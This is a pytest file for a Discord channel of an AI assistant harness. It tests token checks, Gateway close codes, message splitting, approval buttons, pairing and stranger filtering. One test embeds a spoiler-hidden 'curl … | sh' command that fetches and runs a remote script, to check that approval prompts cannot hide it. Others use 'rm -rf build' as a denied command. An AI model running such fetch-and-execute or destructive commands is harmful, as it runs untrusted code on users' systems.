"""Discord 通道的测试：手写的 Gateway 客户端、REST 客户端，以及一整条"手机 → 智狐 → 手机"的路。

对着本地的假 Discord（tests/fake_discord.py）：REST 和 Gateway 都是真的 HTTP 和 WebSocket，走的是真实的代码路径。
组装见 tests/channel_rig.py。不连真正的 Discord，不花钱。

前面几节不用组装整个程序：token 的样子、关闭代码的分类、事件怎么变成消息和按钮、REST 客户端（检查 token、出错、
限流、拆长消息、确认请求）。后面几节把整个程序组装起来（s = bot(...)），测试代码扮演手机上的你（s.say、s.fake.press、
s.fake.command）和浏览器（s.browser）：命令、陌生人和配对、确认、断线重连、长消息、附件、密钥。

重连的等待（每次翻倍的退避、op 9 之后"等一小会儿再登录"）在测试里换掉了（quick、pause 这两个 fixture），不真的等。
"""

from __future__ import annotations

import base64
import io
import json
import logging
import random
import threading
import time
import types
import zipfile
from dataclasses import replace
from datetime import datetime

import pytest
from channel_rig import rig_fixture
from fake_api import reply, text, tool_use
from fake_discord import (
    APP_ID,
    BOT_ID,
    OWNER,
    OWNER_CHAT,
    OWNER_NAME,
    TOKEN,
    FakeDiscord,
    utf16,
)
from oscmd import mark_then_sleep
from sample_files import JPEG_BYTES, PDF_BYTES, PNG_BYTES
from test_channels import (
    fences_balanced,
    result_text,
    run,
    stop_later,
    tool_results,
    until,
)
from test_send_file import result_of, send

from harness import export, log
from harness.channels import gateway, markup
from harness.channels.base import (
    ChannelError,
    Inbound,
    OutboundFile,
    Press,
    Prompt,
    Uploads,
    transient,
)
from harness.channels.discord import (
    DiscordChannel,
    DiscordError,
    RestAPI,
    check,
    classify,
    valid_token,
)
from harness.channels.router import commands
from harness.channels.store import ChannelStore
from harness.config import CHANNEL_DOWNLOAD_BYTES, PAIRING_ATTEMPTS

# 样子对、但假 Discord 不认的 token（和在开发者后台点过 Reset Token 以后的旧 token 一样）
REJECTED = "OTk5OTk5OTk5OTk5OTk5OTk5.Gother.another-fake-token-discord-rejects"
SECRET_PART = TOKEN.split(".")[2]  # token 真正保密的是第三段（第一段只是机器人编号的 base64）
MESSAGES = f"POST /channels/{OWNER_CHAT}/messages"


@pytest.fixture
def bot(make_config, monkeypatch):
    yield from rig_fixture(make_config, monkeypatch, lambda: FakeDiscord().start())


@pytest.fixture
def fake():
    """只有假 Discord，没有整个程序：测客户端本身。"""
    server = FakeDiscord().start()
    yield server
    stop_later(server.stop)


@pytest.fixture
def quick(monkeypatch):
    """重连不等：退避的时间、op 9 之后"等一小会儿再登录"都换成几毫秒。"""
    monkeypatch.setattr(gateway, "backoff", lambda delay, ceiling: (0.01, delay))
    monkeypatch.setattr(gateway, "random", types.SimpleNamespace(uniform=lambda low, high: 0.01, random=random.random))


class Pause:
    """换掉 gateway.backoff：断开以后、重连之前停在这里（entered），等测试说"可以了"（go）。
    这样"断线的这段时间里"发生的事（你发了一条消息）是确定的，不靠时间碰运气。"""

    def __init__(self) -> None:
        self.entered = threading.Event()
        self.go = threading.Event()

    def __call__(self, delay: float, ceiling: float) -> tuple[float, float]:
        self.entered.set()
        self.go.wait(5)
        return 0.0, delay


@pytest.fixture
def pause(monkeypatch):
    # 写在 bot 后面（def test_x(bot, pause)）：收尾时先放行，再关程序，网关的线程不会卡在这里
    held = Pause()
    monkeypatch.setattr(gateway, "backoff", held)
    yield held
    held.go.set()


def client(fake: FakeDiscord, token: str = TOKEN) -> DiscordChannel:
    """一个连着假 Discord 的通道（不 start：只用它发消息、看它怎么理解事件）。"""
    return DiscordChannel(token, fake.base_url + "/api/v10", app_id=APP_ID)


def prompt(detail: str, id: int = 7, where: str = "工作目录：/srv/app") -> Prompt:
    return Prompt(id=id, title="助手想要执行命令：", detail=detail, where=where, allow="允许", deny="拒绝", hint="回复“允许”或“拒绝”。")


def ending(edit: dict) -> str:
    """改过的确认请求的最后一行（写着结果：**已允许**……）。"""
    return edit["content"].rsplit("\n", 1)[-1]


def code_body(message: dict) -> str:
    """一条确认请求里代码块中的内容。"""
    return message["plain"].split("```\n", 1)[1].rsplit("\n```", 1)[0]


# ---- token 的样子、关闭代码 ------------------------------------------------------


def test_a_token_is_checked_for_its_shape_only():
    assert valid_token(TOKEN) and valid_token(REJECTED)
    for bad in ("", "nonsense", "abc.def.ghi", TOKEN + ".extra", f" {TOKEN}", TOKEN + "\n", TOKEN.replace(".", ":"),
                "123456789:" + "A" * 35, TOKEN[:-30], "é" * 24 + ".GfakeA." + "x" * 30, TOKEN.replace("G", "+", 1)):
        assert not valid_token(bad), bad


@pytest.mark.parametrize(
    ("code", "outcome", "words"),
    [
        (4004, gateway.FATAL, "不认这个 token"),  # token 不对：再连也没用
        (4013, gateway.FATAL, "intents"),
        (4014, gateway.FATAL, "intents"),
        (4010, gateway.FATAL, "4010"),
        (4011, gateway.FATAL, "4011"),
        (4012, gateway.FATAL, "4012"),
        (4003, gateway.IDENTIFY_NEXT, ""),  # 会话不能接着用了：重新登录
        (4007, gateway.IDENTIFY_NEXT, ""),
        (4009, gateway.IDENTIFY_NEXT, ""),
        *[(code, gateway.RESUME_NEXT, "") for code in (4000, 4001, 4002, 4005, 4008, 1000, 1001, 1006, gateway.KEEP_SESSION)],
    ],
)
def test_close_codes_are_sorted_like_the_discord_table(code, outcome, words):
    got, why = classify(code)
    assert got == outcome
    assert (words in why and TOKEN not in why) if words else why == ""


# ---- 事件 → 消息和按钮 --------------------------------------------------------------


def test_messages_become_inbound_and_the_rest_is_ignored(fake):
    channel = client(fake)
    channel.me = BOT_ID
    author = {"id": OWNER, "username": "akxan", "global_name": "Akxan"}

    def message(**fields):
        return channel._message({"id": "1", "channel_id": OWNER_CHAT, "author": author, "content": "你好", **fields})

    inbound = message()
    assert isinstance(inbound, Inbound)
    assert (inbound.platform, inbound.chat, inbound.user, inbound.name, inbound.text, inbound.private) == ("discord", OWNER_CHAT, OWNER, OWNER_NAME, "你好", True)
    assert message(guild_id="42").private is False  # 服务器里的频道：router 一律不理
    assert message(author={"id": OWNER, "username": "akxan"}).name == "akxan"
    assert message(author={**author, "bot": True}) is None  # 别的机器人
    assert message(author={"id": BOT_ID, "username": "zhifox_test"}) is None  # 自己发的（Discord 也会推回来）
    assert message(author=None) is None
    assert message(content="", type=6) is None  # 系统消息（置顶了一条……）
    assert message(content="", sticker_items=[{"id": "1", "name": "wave"}]).unsupported == "sticker"

    files = message(content="看看", attachments=[
        {"filename": "cat.png", "content_type": "image/png", "size": 10, "url": "https://cdn.discordapp.com/attachments/1/2/cat.png"},
        {"filename": "报告.pdf", "size": "大", "url": "https://cdn.discordapp.com/attachments/1/3/r.pdf"},
        {"filename": "没有地址的"},
    ]).files
    assert [(item.name, item.kind, item.media_type, item.size) for item in files] == [
        ("cat.png", "photo", "image/png", 10),
        ("报告.pdf", "document", "application/octet-stream", None),
    ]


def test_presses_and_commands_become_events_and_are_acknowledged_at_once(fake):
    channel = client(fake)
    channel.set_commands(commands())
    ask = {"id": "5", "chat": OWNER_CHAT, "components": [{"type": 1, "components": [{"custom_id": "ok:12"}, {"custom_id": "no:12"}]}]}

    # 按钮：答复成功时回 type 6（"收到了"，按钮随后被换成结果）；有问题时回一句只有他看得到的话
    event = fake.press(ask)
    press = channel._interaction(event["d"])
    assert isinstance(press, Press) and (press.chat, press.user, press.name, press.data) == (OWNER_CHAT, OWNER, OWNER_NAME, "ok:12")
    press.answer("已允许")
    assert fake.callback_of(event) == {"id": event["d"]["id"], "token": event["d"]["token"], "type": 6}
    event = fake.press(ask, allow=False)
    channel._interaction(event["d"]).answer("这个确认请求已经处理过了", True)
    assert fake.callback_of(event)["data"] == {"content": "这个确认请求已经处理过了", "flags": 64}
    # 在服务器里点的：chat 是空的，router 找不到这个聊天，不算数
    assert channel._interaction(fake.press(ask, private=False)["d"]).chat == ""

    # 斜杠命令：马上回一行灰色的小字（命令的说明），真正的回答由 router 照常发到聊天里
    event = fake.command("new")
    inbound = channel._interaction(event["d"])
    assert isinstance(inbound, Inbound) and (inbound.chat, inbound.user, inbound.text, inbound.private) == (OWNER_CHAT, OWNER, "/new", True)
    assert fake.callback_of(event) == {"id": event["d"]["id"], "token": event["d"]["token"], "type": 4,
                                       "data": {"content": "-# " + commands()["new"], "allowed_mentions": {"parse": []}}}
    # 在服务器里用的：只有他看得到的一句"只能在私聊里用"，不交给 router
    event = fake.command("status", private=False)
    assert channel._interaction(event["d"]) is None
    refusal = fake.callback_of(event)
    assert refusal["type"] == 4 and refusal["data"]["flags"] == 64 and "私聊" in refusal["data"]["content"]
    # 别的交互（自动补全、弹窗……）：智狐不用它们，不理
    assert channel._interaction({"id": "x", "token": "y", "type": 4, "channel_id": OWNER_CHAT}) is None
    assert len(fake.callbacks) == 4


# ---- REST 客户端 ------------------------------------------------------------------


def test_check_rejects_a_malformed_token_without_asking_discord(fake, make_config):
    config = make_config(**fake.config())
    for bad in ("", "nonsense", "123456789:" + "A" * 35, TOKEN + ".x", TOKEN[:-30]):
        with pytest.raises(ChannelError, match="不像是一个 Discord 机器人的 token"):
            check(config, {"token": bad})
    assert fake.requests == []  # 样子都不对，就不用去问 Discord 了
    assert check(config, {"token": f"  {TOKEN}\n"}) == fake.bot  # 粘贴时带上的空白去掉
    assert fake.requests == ["GET /users/@me", "GET /oauth2/applications/@me"]


def test_check_explains_a_rejected_token_and_an_unreachable_discord(fake, make_config):
    with pytest.raises(ChannelError) as caught:
        check(make_config(**fake.config()), {"token": REJECTED})
    assert "不认这个 token" in str(caught.value) and REJECTED not in str(caught.value)

    fake.fail_next["GET /users/@me"] = (200, {"weird": True})
    with pytest.raises(ChannelError, match="看不懂"):
        check(make_config(**fake.config()), {"token": TOKEN})

    with pytest.raises(ChannelError) as caught:  # 连不上：说清楚是连不上，token 不出现在说明里
        check(make_config(discord_api="http://127.0.0.1:9/api/v10"), {"token": TOKEN})
    assert "连不上 Discord" in str(caught.value) and TOKEN not in str(caught.value)


def test_rest_errors_are_explained_and_never_contain_the_token(fake):
    api = RestAPI(TOKEN, fake.base_url + "/api/v10")
    body = {"content": "hi", "allowed_mentions": {"parse": []}}
    # Discord 的说明里万一带着 token（比如原样回显了请求头），给人看的话里换成 <hidden>
    fake.fail_next[MESSAGES] = (400, {"code": 50035, "message": f"Invalid Form Body: Authorization: Bot {TOKEN}"})
    with pytest.raises(DiscordError) as caught:
        api.call("POST", f"/channels/{OWNER_CHAT}/messages", body)
    assert (caught.value.status, caught.value.code) == (400, 50035)
    assert TOKEN not in str(caught.value) and SECRET_PART not in str(caught.value) and "<hidden>" in str(caught.value)

    for failure, words in [
        ((401, {"message": f"401: Unauthorized {TOKEN}", "code": 0}), "不认这个 token"),
        ((403, {"message": "Cannot send messages to this user", "code": 50007}), "不让机器人给这个人发私信"),
        ((403, {"message": "Missing Permissions", "code": 50013}), "没有这个权限"),
        ((500, {"message": "Internal Server Error", "code": 0}), "Internal Server Error"),
    ]:
        fake.fail_next[MESSAGES] = failure
        with pytest.raises(DiscordError, match=words) as caught:
            api.call("POST", f"/channels/{OWNER_CHAT}/messages", body)
        assert TOKEN not in str(caught.value)
    # 日志也挡着：RestAPI 一建好就把 token 登记成要遮住的密钥
    assert TOKEN not in log.redact(f"Authorization: Bot {TOKEN}")


def test_sending_waits_out_a_rate_limit_and_tries_again(fake):
    channel = client(fake)
    fake.fail_next[MESSAGES] = (429, {"message": "You are being rate limited.", "retry_after": 0.05, "global": False})
    started = time.monotonic()
    channel.send(OWNER_CHAT, "你好")
    assert time.monotonic() - started >= 0.05  # 按 Discord 说的等了一会儿
    assert fake.requests.count(MESSAGES) == 2 and [message["plain"] for message in fake.sent] == ["你好"]


def test_a_long_reply_is_split_into_messages_discord_accepts(fake):
    channel = client(fake)
    reply_text = "\n\n".join(
        f"#### 第 {n} 部分\n" + "说明文字 **粗** 😀 " * 40 + "\n```bash\n" + "\n".join(f"echo {n}-{i}" for i in range(60)) + "\n```" for n in range(12)
    )
    assert utf16(reply_text) > 3 * 2000
    channel.send(OWNER_CHAT, reply_text, markdown=True)
    assert len(fake.sent) >= 4
    for message in fake.sent:  # 假 Discord 已经拒绝过超过 2000 个字的
        assert utf16(message["plain"]) <= 2000 and fences_balanced(message["plain"]), message["plain"]
    shown = "\n".join(message["plain"] for message in fake.sent)
    for n in range(12):
        assert f"**第 {n} 部分**" in shown  # Discord 不认 #### 这一级标题：换成了粗体
        assert all(f"echo {n}-{i}" in shown for i in range(60))
    assert all(message["components"] == [] for message in fake.sent)


def test_backticks_inside_code_never_push_a_message_over_the_limit(fake):
    # 代码块里的每个 ``` 都要插进一个看不见的字符（免得它把代码块提前关上），文字就变长了：
    # 按变长以前的长度拆，一段 1900 个字的代码排完可能有 2200 个字，Discord 会整条拒绝
    channel = client(fake)
    lines = ["a```b```c"] * 400
    channel.send(OWNER_CHAT, "```\n" + "\n".join(lines) + "\n```", markdown=True)
    channel.ask(OWNER_CHAT, prompt("\n".join(lines)))
    assert all(utf16(message["plain"]) <= 2000 and fences_balanced(message["plain"]) for message in fake.sent)
    shown = [line for message in fake.sent for line in message["plain"].splitlines() if "a`" in line]
    assert shown == [markup.fence_safe("a```b```c")] * 800  # 一行都没丢


def test_a_confirmation_gets_two_buttons_and_is_settled_in_place(fake):
    channel = client(fake)
    handle = channel.ask(OWNER_CHAT, prompt("$ echo '**粗** @everyone' && echo ```"))
    (message,) = fake.sent
    assert handle == message["id"]
    # 标题加粗；命令原样放在代码块里（里面的 ** 不会变成粗体，``` 也关不上代码块）；@everyone 不会真的 @ 到谁（假 Discord 查过 allowed_mentions）
    assert message["content"] == "**助手想要执行命令：**\n```\n$ echo '**粗** @everyone' && echo `\u200b``\n```\n工作目录：/srv/app"
    assert [(button["label"], button["custom_id"], button["style"]) for button in fake.buttons(message)] == [("允许", "ok:7", 3), ("拒绝", "no:7", 4)]

    # 答复了：同一条消息去掉按钮、在末尾写上结果
    channel.settle(OWNER_CHAT, handle, "已允许")
    (edit,) = fake.edits
    assert edit["components"] == [] and edit["content"] == message["content"] + "\n\n**已允许**" and edit["allowed_mentions"] == {"parse": []}
    channel.settle(OWNER_CHAT, handle, "已允许")  # 已经写过结果的不再改
    assert len(fake.edits) == 1

    # 改不了（消息被删了）：另发一条说明结果
    second = channel.ask(OWNER_CHAT, prompt("$ ls"))
    fake.fail_next[f"PATCH /channels/{OWNER_CHAT}/messages/{second}"] = (404, {"code": 10008, "message": "Unknown Message"})
    channel.settle(OWNER_CHAT, second, "已拒绝")
    assert fake.sent[-1]["plain"] == "已拒绝" and len(fake.edits) == 1


def test_an_edit_that_hits_a_discord_outage_is_left_for_the_send_queue_to_retry(fake):
    # Discord 出了故障（5xx）：不是这条消息的问题，不另发一条"已允许"顶替，原样抛出，由发送队列过一会儿再改（见 channels/outbox.py）；
    # 那条消息的样子要留着，再改的那一次才改得出来
    channel = client(fake)
    handle = channel.ask(OWNER_CHAT, prompt("$ ls"))
    fake.fail_next[f"PATCH /channels/{OWNER_CHAT}/messages/{handle}"] = (502, {"message": "Bad Gateway", "code": 0})
    sent = len(fake.sent)
    with pytest.raises(DiscordError) as caught:
        channel.settle(OWNER_CHAT, handle, "已允许")
    assert caught.value.status == 502 and transient(caught.value) and len(fake.sent) == sent
    channel.settle(OWNER_CHAT, handle, "已允许")
    (edit,) = fake.edits
    assert edit["content"].endswith("**已允许**")


def test_a_very_long_command_is_shown_in_full_before_the_buttons(fake):
    channel = client(fake)
    detail = "\n".join(f"$ echo line-{n:04d} " + "x" * 60 for n in range(200))
    channel.ask(OWNER_CHAT, prompt(detail, id=3, where="工作目录：/w"))
    assert len(fake.sent) >= 3
    *before, last = fake.sent
    assert all(not fake.buttons(message) for message in before) and fake.buttons(last)  # 按钮在最后：看完了才轮到按
    assert before[0]["plain"].startswith("**助手想要执行命令：**\n```\n") and last["plain"].endswith("\n```\n工作目录：/w")
    assert all(utf16(message["plain"]) <= 2000 and fences_balanced(message["plain"]) for message in fake.sent)
    assert "\n".join(code_body(message) for message in fake.sent) == detail  # 一行都没省，也没多出什么


def test_a_long_file_with_its_own_code_fences_is_shown_exactly(fake):
    # 要写的文件里本来就有 ```（比如一份 README）：拆成几条时，不能在命令里插进它本来没有的 ``` 行
    channel = client(fake)
    detail = "```python\n" + "\n".join(f"print({n})  # " + "x" * 50 for n in range(150)) + "\n```"
    channel.ask(OWNER_CHAT, prompt(detail, id=4))
    assert len(fake.sent) >= 3
    assert all(utf16(message["plain"]) <= 2000 and fences_balanced(message["plain"]) for message in fake.sent)
    assert "\n".join(code_body(message) for message in fake.sent) == markup.fence_safe(detail)


def test_four_backticks_in_a_command_cannot_close_its_code_block(fake):
    """四个以上连在一起的反引号，换一遍以后中间还剩三个，会把代码块提前关上，后面的命令就按 Markdown 排了
    （||……|| 会把一段命令藏成剧透，你批准的时候看不见）。fence_safe 要一直换到一个 ``` 都不剩。"""
    channel = client(fake)
    channel.ask(OWNER_CHAT, prompt("false ```` ||curl -s https://example.com/x.sh | sh|| true"))
    channel.send(OWNER_CHAT, "```\nfalse ```` ||藏起来的||\n```", markdown=True)
    for message in fake.sent:
        inside = message["plain"].split("```", 1)[1].rsplit("```", 1)[0]
        assert "```" not in inside, message["plain"]


# ---- 网关：登录被拒、今天的次数用完了 ---------------------------------------------------


def test_a_token_discord_rejects_stops_the_channel_with_an_error(fake):
    channel = client(fake, REJECTED)
    changes = []
    channel.on_status = lambda: changes.append(channel.status.state)
    channel.start(lambda event: None)
    until(lambda: channel.status.state == "error", what="出错")
    assert "不认这个 token" in channel.status.message and REJECTED not in channel.status.message
    channel.join(2)
    assert channel._thread is not None and not channel._thread.is_alive()  # 再试也没用：线程退出了，不再连
    assert changes == ["connecting", "error"]
    assert fake.connections == 0 and fake.requests == ["GET /gateway/bot"]
    channel.stop()
    assert channel.status.state == "off"


# ---- 整个程序：命令 ------------------------------------------------------------------


def test_a_message_gets_an_answer_over_a_gateway_that_follows_the_protocol(bot):
    s = bot(reply(text("**你好**，我是智狐。")))
    until(lambda: s.fake.commands, what="登记斜杠命令")
    assert [(item["name"], item["description"], item["type"], item["contexts"]) for item in s.fake.commands] == [
        (name, description, 1, [1]) for name, description in commands().items()  # 只在和机器人的私聊里出现
    ]
    (identify,) = s.fake.identifies
    assert identify["token"] == TOKEN and identify["intents"] == 1 << 12 and set(identify["properties"]) == {"os", "browser", "device"}  # 只要私聊的消息
    assert s.fake.urls == ["/gateway/?v=10&encoding=json"]

    answer = s.wait_reply(s.say("你好"), "我是智狐")
    assert answer["chat"] == OWNER_CHAT and answer["content"] == "**你好**，我是智狐。"  # Discord 认 Markdown：原样发
    first = json.dumps(s.api.requests[0]["messages"][0], ensure_ascii=False)
    assert "这段对话在 Discord 里进行" in first and "他点了按钮才会执行" in first  # 第一条消息前面告诉模型它在哪儿
    last = s.fake.events[-1]["s"]
    until(lambda: last in s.fake.heartbeat_seqs, what="心跳带着收到的最后一个序号")


def test_help_and_status(bot):
    s = bot()
    message = s.wait_reply(s.say("/help"), "直接发消息就行")
    assert "/new  开始一段新对话" in message["plain"] and "/stop  停下正在进行的这一轮" in message["plain"]
    assert "允许 / 拒绝" in message["plain"]  # Discord 有按钮：说的是"点按钮"那一种
    status = s.wait_reply(s.say("/status"), "现在：")["plain"]
    assert "确认方式：每次都问" in status and "会话：新对话" in status and "现在：空闲" in status
    assert "今天花了 $0.0000，本月 $0.0000" in status
    assert s.api.requests == []  # 命令不经过模型，不花钱


def test_slash_commands_are_answered_at_once_and_the_reply_follows(bot):
    s = bot()
    until(lambda: s.fake.commands, what="登记斜杠命令")
    for name, expected in (("help", "直接发消息就行"), ("status", "现在：空闲"), ("stop", "现在没有在进行的事"), ("new", "开始一段新对话")):
        before = len(s.fake.sent)
        event = s.fake.command(name)
        ack = s.fake.callback_of(event)
        # Discord 要求 3 秒内回应：先回一行灰色的小字（命令的说明），所有人都看得到的普通回应，不是只有他看得到的那种
        assert ack["type"] == 4 and ack["data"] == {"content": "-# " + commands()[name], "allowed_mentions": {"parse": []}}
        answer = s.wait_reply(before, expected)
        assert s.fake.timeline.index(("callback", event["d"]["id"])) < s.fake.timeline.index(("message", answer["id"]))
    assert s.api.requests == []


def test_a_slash_command_in_a_server_is_refused_privately_and_not_run(bot):
    s = bot()
    event = s.fake.command("status", private=False, chat="guild-channel")
    refusal = s.fake.callback_of(event)
    assert refusal["type"] == 4 and refusal["data"]["flags"] == 64 and "私聊" in refusal["data"]["content"]  # 只有他看得到
    s.sentinel()
    assert [message["chat"] for message in s.fake.sent] == [OWNER_CHAT] and not any("现在：" in message["plain"] for message in s.fake.sent)


def test_new_starts_another_conversation(bot):
    s = bot(reply(text("这是第一段的回答")), reply(text("这是第二段的回答")))
    s.wait_reply(s.say("第一段"), "这是第一段的回答")
    s.idle()
    first = s.session().conversation.id
    until(lambda: s.fake.commands, what="登记斜杠命令")
    before = len(s.fake.sent)
    s.fake.command("new")  # 从命令菜单里选的 /new
    s.wait_reply(before, "开始一段新对话")
    s.wait_reply(s.say("第二段"), "这是第二段的回答")
    s.idle()
    second = s.session().conversation.id

    assert first != second
    assert len(s.api.requests[1]["messages"]) == 1  # 新的一段从头开始，不带着上一段的内容
    assert {(item["id"], item["title"], item.get("channel")) for item in s.app.store.summaries()} == {
        (first, "第一段", "discord"),
        (second, "第二段", "discord"),
    }
    assert s.hub.store.conversation_of("discord", OWNER_CHAT) == second


def test_stop_while_waiting_for_a_confirmation(bot):
    s = bot(run("toolu_1", "echo 不该运行 > ran.txt"), reply(text("停下以后的回答")))
    ask = s.asked(s.say("跑个命令"))

    s.wait_reply(s.say("/new"), "这一轮还没结束")  # 正在进行的时候不能换一段新的
    stopping = s.say("/stop")
    s.wait_reply(stopping, "好，正在停下")
    s.wait_reply(stopping, "已中断。")
    assert ending(s.fake.edit_of(ask)) == "**已中断**"  # 按钮去掉了，写着结果
    s.idle()
    assert not (s.config.workspace / "ran.txt").exists()

    # 按钮已经没用了：再点只会收到一句只有你看得到的提示
    late = s.fake.callback_of(s.fake.press(ask))
    assert late["type"] == 4 and late["data"] == {"content": "这个确认请求已经处理过了", "flags": 64}

    # 每个工具调用都有结果（被中断的也有），下一轮接着聊不会被 API 拒绝
    s.wait_reply(s.say("继续"), "停下以后的回答")
    history = s.api.requests[1]["messages"]
    results = [block for message in history if isinstance(message["content"], list) for block in message["content"] if block.get("type") == "tool_result"]
    assert [block["tool_use_id"] for block in results] == ["toolu_1"]
    s.idle()
    s.wait_reply(s.say("/stop"), "现在没有在进行的事")


def test_stop_from_the_command_menu_kills_a_running_command(bot):
    s = bot(run("toolu_1", mark_then_sleep("started", 30)), approval="all")
    until(lambda: s.fake.commands, what="登记斜杠命令")
    start = s.say("跑一个很久的命令")
    s.wait_reply(start, "已自动允许")  # 全部自动允许：没问就执行了，聊天里照样看得到它做了什么
    until(lambda: (s.config.workspace / "started").exists(), what="命令开始运行")
    began = time.monotonic()
    stopping = len(s.fake.sent)
    ack = s.fake.callback_of(s.fake.command("stop"))
    assert ack["data"]["content"] == "-# " + commands()["stop"]
    s.wait_reply(stopping, "好，正在停下")
    s.wait_reply(stopping, "已中断。")
    s.idle()
    # sleep 30 被结束了，不用等它跑完。留得宽一些：GitHub 的 macOS 机器忙的时候整轮测试慢到平常的四倍（2026-11-23 跑了 19 分钟）
    assert time.monotonic() - began < 25
    assert len(s.api.requests) == 1


# ---- 陌生人、服务器、别的机器人、配对 ------------------------------------------------------


def test_strangers_get_no_reply_at_all_and_servers_and_bots_are_ignored(bot):
    s = bot()
    before = len(s.fake.sent)
    s.fake.user_says("你好", user="777", username="stranger")
    s.fake.user_says("/help", user="777", username="stranger")
    s.fake.user_says("123456", user="777", username="stranger")  # 不在配对的时候，猜配对码也不理
    menu = s.fake.command("help", user="777", chat="dm-777")
    s.fake.user_says("/status", private=False, chat="guild-channel")  # 主人在服务器的频道里：频道里的人都看得到，一律不理
    s.fake.user_says("你好", private=False, chat="guild-channel")
    s.fake.user_says("我是另一个机器人", user="888", username="other_bot", bot=True)
    s.fake.user_says("我是智狐自己", user=BOT_ID, username="zhifox_test")  # 自己发的消息 Discord 也会推回来
    s.sentinel()

    # 一个字都没回：只有主人私聊里的那一条 /help 有回答
    assert [message["chat"] for message in s.fake.sent[before:]] == [OWNER_CHAT]
    assert s.api.requests == []
    assert [item.chat for item in s.hub.router.sessions("discord")] == [OWNER_CHAT]
    # 他从命令菜单里选的那一次：Discord 要求 3 秒内回应（不然他那边显示"交互失败"），回的只是命令的说明，router 什么都没说
    assert s.fake.callback_of(menu)["data"]["content"] == "-# " + commands()["help"]
    # 页面上看得到有人在试：私聊里陌生人发来的 4 次（三条消息、一次命令）。服务器里的、机器人自己的不算
    until(lambda: s.platform()["ignored"] == 4, what="页面上的计数")
    assert s.hub.store.get("discord")["ignored"] == 4


@pytest.mark.parametrize("spaced", [True, False])
def test_pairing_from_the_chat(bot, spaced):
    s = bot(paired=False)
    s.fake.user_says("你好")  # 还没配对，也没在配对：不理
    until(lambda: s.hub.store.get("discord")["ignored"] == 1, what="忽略了这一条")  # 等它处理完再开始配对
    code = s.hub.pair("discord")["code"]
    until(lambda: (s.platform()["pairing"] or {}).get("code") == code, what="页面上的配对码")
    assert s.platform()["pairing"]["link"] == f"https://discord.com/users/{BOT_ID}"  # Discord 的链接只能打开和机器人的私聊

    hint = s.wait_reply(s.say("你好"), "6 位配对码")
    assert hint["chat"] == OWNER_CHAT
    after_hint = s.say("在吗")  # 每个人只提醒一次
    other = s.wait_reply(s.say("嗨", user="777", username="stranger"), "6 位配对码")  # 另一个人也提醒一次
    assert other["chat"] == "dm-777"
    s.fake.user_says("还在吗", user="777", username="stranger")
    wrong = "000000" if code != "000000" else "111111"
    s.wait_reply(s.say(wrong), f"还可以再试 {PAIRING_ATTEMPTS - 1} 次")
    assert [message["chat"] for message in s.fake.sent[after_hint:]] == ["dm-777", OWNER_CHAT]  # "在吗"、"还在吗"都没有回答
    until(lambda: s.platform()["pairing"]["attempts_left"] == PAIRING_ATTEMPTS - 1, what="页面上的剩余次数")

    paired = s.wait_reply(s.say(f"{code[:3]} {code[3:]}" if spaced else code), "配对成功")  # 照着页面上的样子抄，中间带空格也认
    assert OWNER_NAME in paired["plain"] and "/new" in paired["plain"]
    until(lambda: (s.platform()["owner"] or {}).get("name") == OWNER_NAME and s.platform()["pairing"] is None, what="页面上的主人")
    assert s.hub.store.get("discord")["ignored"] == 3  # 配对之前的"你好"、提醒过以后的"在吗"和"还在吗"
    assert "现在：空闲" in s.wait_reply(s.say("/status"), "现在：")["plain"]  # 配好了：主人的消息照常处理
    after = len(s.fake.sent)
    s.fake.user_says("轮到我了吗", user="777", username="stranger")  # 配好以后：别人又是一个字都不回
    s.sentinel()
    assert [message["chat"] for message in s.fake.sent[after:]] == [OWNER_CHAT]


# ---- 确认 ------------------------------------------------------------------


def test_allowing_with_the_button_runs_the_command(bot):
    s = bot(
        reply(text("我来看看。"), tool_use("toolu_1", "run_command", {"command": "echo '**粗**' && pwd"}), stop_reason="tool_use"),
        reply(text("**一切正常**。")),
    )
    start = s.say("看看")
    first = s.wait_reply(start, "我来看看")  # 一段文字写完就发出去，不等整轮结束
    ask = s.asked(start)
    assert s.fake.sent.index(first) < s.fake.sent.index(ask)  # 顺序和助手说的一样

    # 确认请求上写着完整的命令（原样、在代码块里）和工作目录
    assert ask["content"].startswith("**助手想要执行命令：**\n")
    assert "```\n$ echo '**粗**' && pwd\n```" in ask["content"]
    assert ask["content"].endswith(f"工作目录：{s.config.workspace}")
    allow, deny = s.fake.buttons(ask)
    confirm_id = int(allow["custom_id"].removeprefix("ok:"))
    assert (allow["label"], deny["label"], deny["custom_id"], allow["style"], deny["style"]) == ("允许", "拒绝", f"no:{confirm_id}", 3, 4)
    # 网页上也看得到这个等着批准的操作
    (pending,) = until(lambda: s.state()["channels"]["approvals"], what="页面上的确认请求")
    assert (pending["platform"], pending["chat"], pending["id"], pending["name"]) == ("discord", OWNER_CHAT, confirm_id, OWNER_NAME)

    pressed = s.fake.press(ask)
    final = s.wait_reply(start, "一切正常")
    assert final["content"] == "**一切正常**。"
    # 3 秒内回应了这次按钮：type 6（"收到了"，不另说话），只回应了一次
    assert [item for item in s.fake.callbacks if item["id"] == pressed["d"]["id"]] == [{"id": pressed["d"]["id"], "token": pressed["d"]["token"], "type": 6}]
    edit = s.fake.edit_of(ask)
    assert edit["components"] == [] and edit["content"] == ask["content"] + "\n\n**已允许**"
    (result,) = tool_results(s.api.requests[1])
    assert "**粗**" in result_text(result) and str(s.config.workspace) in result_text(result) and not result.get("is_error")
    assert OWNER_CHAT in s.fake.typing  # 这一轮进行的时候，聊天里显示"正在输入"
    s.idle()
    until(lambda: s.state()["channels"]["approvals"] == [], what="页面上的确认请求消失")


def test_denying_with_the_button_tells_the_model(bot):
    s = bot(run("toolu_1", "rm -rf build"), reply(text("好的，不删了。")), reply(text("顺便的回答")))
    start = s.say("清理一下")
    ask = s.asked(start)
    s.wait_reply(s.say("顺便问一下"), "点上面的按钮")  # 等着批准的时候又说了一句：告诉你它排在后面
    pressed = s.fake.press(ask, allow=False)
    s.wait_reply(start, "好的，不删了")
    s.wait_reply(start, "顺便的回答")  # 排着的那一条接着跑
    assert ending(s.fake.edit_of(ask)) == "**已拒绝**"
    assert s.fake.callback_of(pressed)["type"] == 6
    (result,) = tool_results(s.api.requests[1])
    assert result_text(result).startswith("用户拒绝了这个操作") and result["is_error"] is True
    s.idle()


def test_only_the_owner_in_the_private_chat_can_press_the_buttons(bot):
    s = bot(run("toolu_1", "touch pressed.txt"), reply(text("做完了")))
    start = s.say("跑")
    ask = s.asked(start)
    # 别人点的、在服务器里点的：照样要回应（不然他那边显示"交互失败"），但什么都不说、什么都不做
    for press in (s.fake.press(ask, user="777"), s.fake.press(ask, private=False)):
